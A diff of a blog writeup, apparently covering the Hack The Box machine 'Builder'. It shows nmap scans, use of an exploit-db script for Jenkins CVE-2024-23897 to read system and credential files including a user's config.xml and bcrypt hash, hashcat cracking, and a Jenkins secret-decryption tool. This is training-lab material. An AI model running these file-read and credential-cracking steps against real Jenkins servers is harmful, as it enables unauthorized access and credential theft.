@@ -97,38 +97,38 @@
       <div class="content"><p>This post is a writeup for Medium difficulty Hack The Box machine: Builder. In this lab, we leverage CVE-2024-23897 a Local File Inclusion vulnerability to gather credentials for the user <code>jennifer</code>. From here, after logging into the Jenkins instance we use Jennifer&rsquo;s account privileges to manually reset the <code>root</code> user&rsquo;s password. Which then allowed us to view/edit the SSH key information. From there, we use the SSH key to easily log into the machine and get the <code>root</code> flag!</p>
 <h2 id="enumeration">Enumeration</h2>
 <p>Starting off with a full port scan, only scanning open ports and a minimum rate of 10000.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -p- --open --min-rate <span style="color:#ae81ff">10000</span> $IP -oN init.scan
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>22/tcp open ssh
-</span></span><span style="display:flex;"><span>8080/tcp open http-proxy
-</span></span></code></pre></div><p>Now&hellip; moving on to a service version(<code>-sCV</code>)m TCP(<code>sT</code>) scan + OS detection(<code>-O</code>) scan:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -p22,8080 -sCVT -O $IP
-</span></span><span style="display:flex;"><span>-----
-</span></span><span style="display:flex;"><span>Nmap 7.94SVN scan initiated Sun May  <span style="color:#ae81ff">5</span> 14:20:33 <span style="color:#ae81ff">2024</span> as: nmap -p22,8080 -sCVT -O -oN scvt-o.scan 10.129.230.220
-</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.129.230.220
-</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.35s latency<span style="color:#f92672">)</span>.
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>PORT     STATE SERVICE VERSION
-</span></span><span style="display:flex;"><span>22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
-</span></span><span style="display:flex;"><span>| ssh-hostkey: 
-</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">256</span> 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
-</span></span><span style="display:flex;"><span>|_  <span style="color:#ae81ff">256</span> 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
-</span></span><span style="display:flex;"><span>8080/tcp open  http    Jetty 10.0.18
-</span></span><span style="display:flex;"><span>| http-robots.txt: <span style="color:#ae81ff">1</span> disallowed entry 
-</span></span><span style="display:flex;"><span>|_/
-</span></span><span style="display:flex;"><span>|_http-title: Dashboard <span style="color:#f92672">[</span>Jenkins<span style="color:#f92672">]</span>
-</span></span><span style="display:flex;"><span>| http-open-proxy: Potentially OPEN proxy.
-</span></span><span style="display:flex;"><span>|_Methods supported:CONNECTION
-</span></span><span style="display:flex;"><span>|_http-server-header: Jetty<span style="color:#f92672">(</span>10.0.18<span style="color:#f92672">)</span>
-</span></span><span style="display:flex;"><span>Warning: OSScan results may be unreliable because we could not find at least <span style="color:#ae81ff">1</span> open and <span style="color:#ae81ff">1</span> closed port
-</span></span><span style="display:flex;"><span>Aggressive OS guesses: Linux 5.0 <span style="color:#f92672">(</span>96%<span style="color:#f92672">)</span>, Linux 4.15 - 5.8 <span style="color:#f92672">(</span>96%<span style="color:#f92672">)</span>, Linux 5.3 - 5.4 <span style="color:#f92672">(</span>95%<span style="color:#f92672">)</span>, Linux 2.6.32 <span style="color:#f92672">(</span>95%<span style="color:#f92672">)</span>, Linux 5.0 - 5.5 <span style="color:#f92672">(</span>95%<span style="color:#f92672">)</span>, Linux 3.1 <span style="color:#f92672">(</span>95%<span style="color:#f92672">)</span>, Linux 3.2 <span style="color:#f92672">(</span>95%<span style="color:#f92672">)</span>, AXIS 210A or <span style="color:#ae81ff">211</span> Network Camera <span style="color:#f92672">(</span>Linux 2.6.17<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>95%<span style="color:#f92672">)</span>, ASUS RT-N56U WAP <span style="color:#f92672">(</span>Linux 3.4<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>93%<span style="color:#f92672">)</span>, Linux 3.16 <span style="color:#f92672">(</span>93%<span style="color:#f92672">)</span>
-</span></span><span style="display:flex;"><span>No exact OS matches <span style="color:#66d9ef">for</span> host <span style="color:#f92672">(</span>test conditions non-ideal<span style="color:#f92672">)</span>.
-</span></span><span style="display:flex;"><span>Network Distance: <span style="color:#ae81ff">2</span> hops
-</span></span><span style="display:flex;"><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># Nmap done at Sun May  5 14:21:21 2024 -- 1 IP address (1 host up) scanned in 47.58 seconds</span>
-</span></span></code></pre></div><h2 id="site-on-port-8080">Site on Port 8080</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">nmap -p- --open --min-rate <span style="color:#ae81ff">10000</span> $IP -oN init.scan
+
+22/tcp open ssh
+8080/tcp open http-proxy
+</code></pre></div><p>Now&hellip; moving on to a service version(<code>-sCV</code>)m TCP(<code>sT</code>) scan + OS detection(<code>-O</code>) scan:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">nmap -p22,8080 -sCVT -O $IP
+-----
+Nmap 7.94SVN scan initiated Sun May  <span style="color:#ae81ff">5</span> 14:20:33 <span style="color:#ae81ff">2024</span> as: nmap -p22,8080 -sCVT -O -oN scvt-o.scan 10.129.230.220
+Nmap scan report <span style="color:#66d9ef">for</span> 10.129.230.220
+Host is up <span style="color:#f92672">(</span>0.35s latency<span style="color:#f92672">)</span>.
+
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
+| ssh-hostkey: 
+|   <span style="color:#ae81ff">256</span> 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
+|_  <span style="color:#ae81ff">256</span> 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
+8080/tcp open  http    Jetty 10.0.18
+| http-robots.txt: <span style="color:#ae81ff">1</span> disallowed entry 
+|_/
+|_http-title: Dashboard <span style="color:#f92672">[</span>Jenkins<span style="color:#f92672">]</span>
+| http-open-proxy: Potentially OPEN proxy.
+|_Methods supported:CONNECTION
+|_http-server-header: Jetty<span style="color:#f92672">(</span>10.0.18<span style="color:#f92672">)</span>
+Warning: OSScan results may be unreliable because we could not find at least <span style="color:#ae81ff">1</span> open and <span style="color:#ae81ff">1</span> closed port
+Aggressive OS guesses: Linux 5.0 <span style="color:#f92672">(</span>96%<span style="color:#f92672">)</span>, Linux 4.15 - 5.8 <span style="color:#f92672">(</span>96%<span style="color:#f92672">)</span>, Linux 5.3 - 5.4 <span style="color:#f92672">(</span>95%<span style="color:#f92672">)</span>, Linux 2.6.32 <span style="color:#f92672">(</span>95%<span style="color:#f92672">)</span>, Linux 5.0 - 5.5 <span style="color:#f92672">(</span>95%<span style="color:#f92672">)</span>, Linux 3.1 <span style="color:#f92672">(</span>95%<span style="color:#f92672">)</span>, Linux 3.2 <span style="color:#f92672">(</span>95%<span style="color:#f92672">)</span>, AXIS 210A or <span style="color:#ae81ff">211</span> Network Camera <span style="color:#f92672">(</span>Linux 2.6.17<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>95%<span style="color:#f92672">)</span>, ASUS RT-N56U WAP <span style="color:#f92672">(</span>Linux 3.4<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>93%<span style="color:#f92672">)</span>, Linux 3.16 <span style="color:#f92672">(</span>93%<span style="color:#f92672">)</span>
+No exact OS matches <span style="color:#66d9ef">for</span> host <span style="color:#f92672">(</span>test conditions non-ideal<span style="color:#f92672">)</span>.
+Network Distance: <span style="color:#ae81ff">2</span> hops
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+<span style="color:#75715e"># Nmap done at Sun May  5 14:21:21 2024 -- 1 IP address (1 host up) scanned in 47.58 seconds</span>
+</code></pre></div><h2 id="site-on-port-8080">Site on Port 8080</h2>
 <p>Next, I then opened the page on port <code>8080</code>, which brought me to a <code>Jenkins</code>(<code>v2.441</code>) home page.</p>
 <h3 id="cve-2024-23897">CVE-2024-23897</h3>
 <p>A quck google for <code>Jenkins 2.441 exploits</code> brings up <strong>CVE-2024-23897</strong>.</p>
@@ -151,102 +151,102 @@
 <p>Heading over to the <a href="https://www.exploit-db.com/exploits/51993">exploit-db</a> script we found and downloading it, we can first test this out with <code>/etc/passwd</code> which works like a charm. I know from a prefious challenge that the default home user directory running the Jenkins instance is at the path <code>/var/jenkins_home</code> I then simply appended <code>/user.txt</code> to the path, making the full path: <code>/var/jenkins_home/user.txt</code>. Putting this through the exploit script, I was able to use the LFI to read the user flag. The next step will be to get a shell on the target as <code>root</code>. There are multiple ways of doing so in this situation.</p>
 <h3 id="shell-as-root">Shell as Root</h3>
 <p>After a bit of googling and manually spinning up a jenkins to inspect the file paths locally using the latest Jenkins <code>docker</code> image, as well as going through the <a href="https://www.jenkins.io/">Jenkins documentation</a>&hellip; I found that you can get a file called <code>users.xml</code> from <code>/var/jenkins_home/users/users.xml</code> which will return user configuration information. After running the script using this path here is the result:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python exploit.py -u <span style="color:#e6db74">&#34;http://</span>$IP<span style="color:#e6db74">:8080/&#34;</span> -p /var/jenkins_home/users/users.xml
-</span></span><span style="display:flex;"><span>&lt;?xml version<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;1.1&#39;</span> encoding<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;UTF-8&#39;</span>?&gt;
-</span></span><span style="display:flex;"><span>      &lt;string&gt;jennifer_12108429903186576833&lt;/string&gt;
-</span></span><span style="display:flex;"><span>  &lt;idToDirectoryNameMap class<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;concurrent-hash-map&#34;</span>&gt;
-</span></span><span style="display:flex;"><span>    &lt;entry&gt;
-</span></span><span style="display:flex;"><span>      &lt;string&gt;jennifer&lt;/string&gt;
-</span></span><span style="display:flex;"><span>  &lt;version&gt;1&lt;/version&gt;
-</span></span><span style="display:flex;"><span>&lt;/hudson.model.UserIdMapper&gt;
-</span></span><span style="display:flex;"><span>  &lt;/idToDirectoryNameMap&gt;
-</span></span><span style="display:flex;"><span>&lt;hudson.model.UserIdMapper&gt;
-</span></span><span style="display:flex;"><span>    &lt;/entry&gt;
-</span></span></code></pre></div><p>Username found: <code>jennifer</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">python exploit.py -u <span style="color:#e6db74">&#34;http://</span>$IP<span style="color:#e6db74">:8080/&#34;</span> -p /var/jenkins_home/users/users.xml
+&lt;?xml version<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;1.1&#39;</span> encoding<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;UTF-8&#39;</span>?&gt;
+      &lt;string&gt;jennifer_12108429903186576833&lt;/string&gt;
+  &lt;idToDirectoryNameMap class<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;concurrent-hash-map&#34;</span>&gt;
+    &lt;entry&gt;
+      &lt;string&gt;jennifer&lt;/string&gt;
+  &lt;version&gt;1&lt;/version&gt;
+&lt;/hudson.model.UserIdMapper&gt;
+  &lt;/idToDirectoryNameMap&gt;
+&lt;hudson.model.UserIdMapper&gt;
+    &lt;/entry&gt;
+</code></pre></div><p>Username found: <code>jennifer</code></p>
 <p>To get the password, we simply take the value in the <code>&lt;string&gt;VAL_HERE&lt;/string&gt;</code> tags as the directory name, and grab the <code>config.xml</code> file as follows:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python exploit.py -u <span style="color:#e6db74">&#34;http://</span>$IP<span style="color:#e6db74">:8080/&#34;</span> -p /var/jenkins_home/users/jennifer_12108429903186576833/config.xml
-</span></span><span style="display:flex;"><span>    &lt;hudson.tasks.Mailer_-UserProperty plugin<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;mailer@463.vedf8358e006b_&#34;</span>&gt;
-</span></span><span style="display:flex;"><span>    &lt;hudson.search.UserSearchProperty&gt;
-</span></span><span style="display:flex;"><span>      &lt;roles&gt;
-</span></span><span style="display:flex;"><span>    &lt;jenkins.security.seed.UserSeedProperty&gt;
-</span></span><span style="display:flex;"><span>      &lt;/tokenStore&gt;
-</span></span><span style="display:flex;"><span>    &lt;/hudson.search.UserSearchProperty&gt;
-</span></span><span style="display:flex;"><span>      &lt;timeZoneName&gt;&lt;/timeZoneName&gt;
-</span></span><span style="display:flex;"><span>  &lt;properties&gt;
-</span></span><span style="display:flex;"><span>    &lt;jenkins.security.LastGrantedAuthoritiesProperty&gt;
-</span></span><span style="display:flex;"><span>      &lt;flags/&gt;
-</span></span><span style="display:flex;"><span>    &lt;hudson.model.MyViewsProperty&gt;
-</span></span><span style="display:flex;"><span>&lt;/user&gt;
-</span></span><span style="display:flex;"><span>    &lt;/jenkins.security.ApiTokenProperty&gt;
-</span></span><span style="display:flex;"><span>      &lt;views&gt;
-</span></span><span style="display:flex;"><span>        &lt;string&gt;authenticated&lt;/string&gt;
-</span></span><span style="display:flex;"><span>    &lt;org.jenkinsci.plugins.displayurlapi.user.PreferredProviderUserProperty plugin<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;display-url-api@2.200.vb_9327d658781&#34;</span>&gt;
-</span></span><span style="display:flex;"><span>&lt;user&gt;
-</span></span><span style="display:flex;"><span>          &lt;name&gt;all&lt;/name&gt;
-</span></span><span style="display:flex;"><span>  &lt;description&gt;&lt;/description&gt;
-</span></span><span style="display:flex;"><span>      &lt;emailAddress&gt;jennifer@builder.htb&lt;/emailAddress&gt;
-</span></span><span style="display:flex;"><span>      &lt;collapsed/&gt;
-</span></span><span style="display:flex;"><span>    &lt;/jenkins.security.seed.UserSeedProperty&gt;
-</span></span><span style="display:flex;"><span>    &lt;/org.jenkinsci.plugins.displayurlapi.user.PreferredProviderUserProperty&gt;
-</span></span><span style="display:flex;"><span>    &lt;/hudson.model.MyViewsProperty&gt;
-</span></span><span style="display:flex;"><span>      &lt;domainCredentialsMap class<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;hudson.util.CopyOnWriteMap</span>$Hash<span style="color:#e6db74">&#34;</span>/&gt;
-</span></span><span style="display:flex;"><span>          &lt;filterQueue&gt;false&lt;/filterQueue&gt;
-</span></span><span style="display:flex;"><span>    &lt;jenkins.security.ApiTokenProperty&gt;
-</span></span><span style="display:flex;"><span>      &lt;primaryViewName&gt;&lt;/primaryViewName&gt;
-</span></span><span style="display:flex;"><span>      &lt;/views&gt;
-</span></span><span style="display:flex;"><span>    &lt;/hudson.model.TimeZoneProperty&gt;
-</span></span><span style="display:flex;"><span>    &lt;com.cloudbees.plugins.credentials.UserCredentialsProvider_-UserCredentialsProperty plugin<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;credentials@1319.v7eb_51b_3a_c97b_&#34;</span>&gt;
-</span></span><span style="display:flex;"><span>    &lt;/hudson.model.PaneStatusProperties&gt;
-</span></span><span style="display:flex;"><span>    &lt;/hudson.tasks.Mailer_-UserProperty&gt;
-</span></span><span style="display:flex;"><span>        &lt;tokenList/&gt;
-</span></span><span style="display:flex;"><span>    &lt;jenkins.console.ConsoleUrlProviderUserProperty/&gt;
-</span></span><span style="display:flex;"><span>        &lt;/hudson.model.AllView&gt;
-</span></span><span style="display:flex;"><span>      &lt;timestamp&gt;1707318554385&lt;/timestamp&gt;
-</span></span><span style="display:flex;"><span>          &lt;owner class<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;hudson.model.MyViewsProperty&#34;</span> reference<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;../../..&#34;</span>/&gt;
-</span></span><span style="display:flex;"><span>  &lt;/properties&gt;
-</span></span><span style="display:flex;"><span>    &lt;/jenkins.model.experimentalflags.UserExperimentalFlagsProperty&gt;
-</span></span><span style="display:flex;"><span>    &lt;/com.cloudbees.plugins.credentials.UserCredentialsProvider_-UserCredentialsProperty&gt;
-</span></span><span style="display:flex;"><span>    &lt;hudson.security.HudsonPrivateSecurityRealm_-Details&gt;
-</span></span><span style="display:flex;"><span>      &lt;insensitiveSearch&gt;true&lt;/insensitiveSearch&gt;
-</span></span><span style="display:flex;"><span>          &lt;properties class<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;hudson.model.View</span>$PropertyList<span style="color:#e6db74">&#34;</span>/&gt;
-</span></span><span style="display:flex;"><span>    &lt;hudson.model.TimeZoneProperty&gt;
-</span></span><span style="display:flex;"><span>        &lt;hudson.model.AllView&gt;
-</span></span><span style="display:flex;"><span>    &lt;/hudson.security.HudsonPrivateSecurityRealm_-Details&gt;
-</span></span><span style="display:flex;"><span>      &lt;providerId&gt;default&lt;/providerId&gt;
-</span></span><span style="display:flex;"><span>      &lt;/roles&gt;
-</span></span><span style="display:flex;"><span>    &lt;/jenkins.security.LastGrantedAuthoritiesProperty&gt;
-</span></span><span style="display:flex;"><span>    &lt;jenkins.model.experimentalflags.UserExperimentalFlagsProperty&gt;
-</span></span><span style="display:flex;"><span>    &lt;hudson.model.PaneStatusProperties&gt;
-</span></span><span style="display:flex;"><span>&lt;?xml version<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;1.1&#39;</span> encoding<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;UTF-8&#39;</span>?&gt;
-</span></span><span style="display:flex;"><span>  &lt;fullName&gt;jennifer&lt;/fullName&gt;
-</span></span><span style="display:flex;"><span>      &lt;seed&gt;6841d11dc1de101d&lt;/seed&gt;
-</span></span><span style="display:flex;"><span>  &lt;id&gt;jennifer&lt;/id&gt;
-</span></span><span style="display:flex;"><span>  &lt;version&gt;10&lt;/version&gt;
-</span></span><span style="display:flex;"><span>      &lt;tokenStore&gt;
-</span></span><span style="display:flex;"><span>          &lt;filterExecutors&gt;false&lt;/filterExecutors&gt;
-</span></span><span style="display:flex;"><span>    &lt;io.jenkins.plugins.thememanager.ThemeUserProperty plugin<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;theme-manager@215.vc1ff18d67920&#34;</span>/&gt;
-</span></span><span style="display:flex;"><span>      &lt;passwordHash&gt;#jbcrypt:$2a$10$UwR7BpEH.ccfpi1tv6w/XuBtS44S7oUpR2JYiobqxcDQJeN/L4l1a&lt;/passwordHash&gt;
-</span></span></code></pre></div><p>Hash found: <code>$2a$10$UwR7BpEH.ccfpi1tv6w/XuBtS44S7oUpR2JYiobqxcDQJeN/L4l1a</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">python exploit.py -u <span style="color:#e6db74">&#34;http://</span>$IP<span style="color:#e6db74">:8080/&#34;</span> -p /var/jenkins_home/users/jennifer_12108429903186576833/config.xml
+    &lt;hudson.tasks.Mailer_-UserProperty plugin<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;mailer@463.vedf8358e006b_&#34;</span>&gt;
+    &lt;hudson.search.UserSearchProperty&gt;
+      &lt;roles&gt;
+    &lt;jenkins.security.seed.UserSeedProperty&gt;
+      &lt;/tokenStore&gt;
+    &lt;/hudson.search.UserSearchProperty&gt;
+      &lt;timeZoneName&gt;&lt;/timeZoneName&gt;
+  &lt;properties&gt;
+    &lt;jenkins.security.LastGrantedAuthoritiesProperty&gt;
+      &lt;flags/&gt;
+    &lt;hudson.model.MyViewsProperty&gt;
+&lt;/user&gt;
+    &lt;/jenkins.security.ApiTokenProperty&gt;
+      &lt;views&gt;
+        &lt;string&gt;authenticated&lt;/string&gt;
+    &lt;org.jenkinsci.plugins.displayurlapi.user.PreferredProviderUserProperty plugin<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;display-url-api@2.200.vb_9327d658781&#34;</span>&gt;
+&lt;user&gt;
+          &lt;name&gt;all&lt;/name&gt;
+  &lt;description&gt;&lt;/description&gt;
+      &lt;emailAddress&gt;jennifer@builder.htb&lt;/emailAddress&gt;
+      &lt;collapsed/&gt;
+    &lt;/jenkins.security.seed.UserSeedProperty&gt;
+    &lt;/org.jenkinsci.plugins.displayurlapi.user.PreferredProviderUserProperty&gt;
+    &lt;/hudson.model.MyViewsProperty&gt;
+      &lt;domainCredentialsMap class<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;hudson.util.CopyOnWriteMap</span>$Hash<span style="color:#e6db74">&#34;</span>/&gt;
+          &lt;filterQueue&gt;false&lt;/filterQueue&gt;
+    &lt;jenkins.security.ApiTokenProperty&gt;
+      &lt;primaryViewName&gt;&lt;/primaryViewName&gt;
+      &lt;/views&gt;
+    &lt;/hudson.model.TimeZoneProperty&gt;
+    &lt;com.cloudbees.plugins.credentials.UserCredentialsProvider_-UserCredentialsProperty plugin<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;credentials@1319.v7eb_51b_3a_c97b_&#34;</span>&gt;
+    &lt;/hudson.model.PaneStatusProperties&gt;
+    &lt;/hudson.tasks.Mailer_-UserProperty&gt;
+        &lt;tokenList/&gt;
+    &lt;jenkins.console.ConsoleUrlProviderUserProperty/&gt;
+        &lt;/hudson.model.AllView&gt;
+      &lt;timestamp&gt;1707318554385&lt;/timestamp&gt;
+          &lt;owner class<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;hudson.model.MyViewsProperty&#34;</span> reference<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;../../..&#34;</span>/&gt;
+  &lt;/properties&gt;
+    &lt;/jenkins.model.experimentalflags.UserExperimentalFlagsProperty&gt;
+    &lt;/com.cloudbees.plugins.credentials.UserCredentialsProvider_-UserCredentialsProperty&gt;
+    &lt;hudson.security.HudsonPrivateSecurityRealm_-Details&gt;
+      &lt;insensitiveSearch&gt;true&lt;/insensitiveSearch&gt;
+          &lt;properties class<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;hudson.model.View</span>$PropertyList<span style="color:#e6db74">&#34;</span>/&gt;
+    &lt;hudson.model.TimeZoneProperty&gt;
+        &lt;hudson.model.AllView&gt;
+    &lt;/hudson.security.HudsonPrivateSecurityRealm_-Details&gt;
+      &lt;providerId&gt;default&lt;/providerId&gt;
+      &lt;/roles&gt;
+    &lt;/jenkins.security.LastGrantedAuthoritiesProperty&gt;
+    &lt;jenkins.model.experimentalflags.UserExperimentalFlagsProperty&gt;
+    &lt;hudson.model.PaneStatusProperties&gt;
+&lt;?xml version<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;1.1&#39;</span> encoding<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;UTF-8&#39;</span>?&gt;
+  &lt;fullName&gt;jennifer&lt;/fullName&gt;
+      &lt;seed&gt;6841d11dc1de101d&lt;/seed&gt;
+  &lt;id&gt;jennifer&lt;/id&gt;
+  &lt;version&gt;10&lt;/version&gt;
+      &lt;tokenStore&gt;
+          &lt;filterExecutors&gt;false&lt;/filterExecutors&gt;
+    &lt;io.jenkins.plugins.thememanager.ThemeUserProperty plugin<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;theme-manager@215.vc1ff18d67920&#34;</span>/&gt;
+      &lt;passwordHash&gt;#jbcrypt:$2a$10$UwR7BpEH.ccfpi1tv6w/XuBtS44S7oUpR2JYiobqxcDQJeN/L4l1a&lt;/passwordHash&gt;
+</code></pre></div><p>Hash found: <code>$2a$10$UwR7BpEH.ccfpi1tv6w/XuBtS44S7oUpR2JYiobqxcDQJeN/L4l1a</code></p>
 <p>Running this through <code>hashid</code>:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>hashid -m <span style="color:#e6db74">&#39;a.ccfpi1tv6w/XuBtS44S7oUpR2JYiobqxcDQJeN/L4l1a&#39;</span>
-</span></span><span style="display:flex;"><span>Analyzing <span style="color:#e6db74">&#39;a.ccfpi1tv6w/XuBtS44S7oUpR2JYiobqxcDQJeN/L4l1a&#39;</span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Blowfish<span style="color:#f92672">(</span>OpenBSD<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Hashcat Mode: 3200<span style="color:#f92672">]</span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Woltlab Burning Board 4.x 
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> bcrypt <span style="color:#f92672">[</span>Hashcat Mode: 3200<span style="color:#f92672">]</span>
-</span></span></code></pre></div><p>And running that through hashcat:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>hashcat -m <span style="color:#ae81ff">3200</span> -a <span style="color:#ae81ff">0</span> hash /usr/share/wordlists/rockyou.txt
-</span></span></code></pre></div><p><strong>(user:pass) - jennifer:[REDACTED]</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">hashid -m <span style="color:#e6db74">&#39;a.ccfpi1tv6w/XuBtS44S7oUpR2JYiobqxcDQJeN/L4l1a&#39;</span>
+Analyzing <span style="color:#e6db74">&#39;a.ccfpi1tv6w/XuBtS44S7oUpR2JYiobqxcDQJeN/L4l1a&#39;</span>
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Blowfish<span style="color:#f92672">(</span>OpenBSD<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Hashcat Mode: 3200<span style="color:#f92672">]</span>
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Woltlab Burning Board 4.x 
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> bcrypt <span style="color:#f92672">[</span>Hashcat Mode: 3200<span style="color:#f92672">]</span>
+</code></pre></div><p>And running that through hashcat:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">hashcat -m <span style="color:#ae81ff">3200</span> -a <span style="color:#ae81ff">0</span> hash /usr/share/wordlists/rockyou.txt
+</code></pre></div><p><strong>(user:pass) - jennifer:[REDACTED]</strong></p>
 <p>Now with the password we get back from cracking the hash, we can log in and begin further enumeration! I should note that after cracking the hash, I attempted to get the <code>master.key</code> file from <code>$HOME/secrets/master.key</code>, which was successful, however the key appears to be encrypted.</p>
 <p>Using <a href="https://github.com/gquere/pwn_jenkins">this page on github</a>, I found a <a href="https://raw.githubusercontent.com/gquere/pwn_jenkins/master/offline_decryption/jenkins_offline_decrypt.py">script</a> that should decrypt the private ssh key in <code>credentials.xml</code>, all I need to do is grab: <code>hudson.util.Secret</code> and I should be able to successfully decrypt the key.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>Usage:
-</span></span><span style="display:flex;"><span>	jenkins_offline_decrypt.py &lt;jenkins_base_path&gt;
-</span></span><span style="display:flex;"><span>or:
-</span></span><span style="display:flex;"><span>	jenkins_offline_decrypt.py &lt;master.key&gt; &lt;hudson.util.Secret&gt; <span style="color:#f92672">[</span>credentials.xml<span style="color:#f92672">]</span>
-</span></span><span style="display:flex;"><span>or:
-</span></span><span style="display:flex;"><span>	jenkins_offline_decrypt.py -i &lt;path&gt; <span style="color:#f92672">(</span>interactive mode<span style="color:#f92672">)</span>
-</span></span></code></pre></div><p>Trying this out had unfortunately no luck, although it was worth a try. Would have made for a pretty easy solution all things considered.</p>
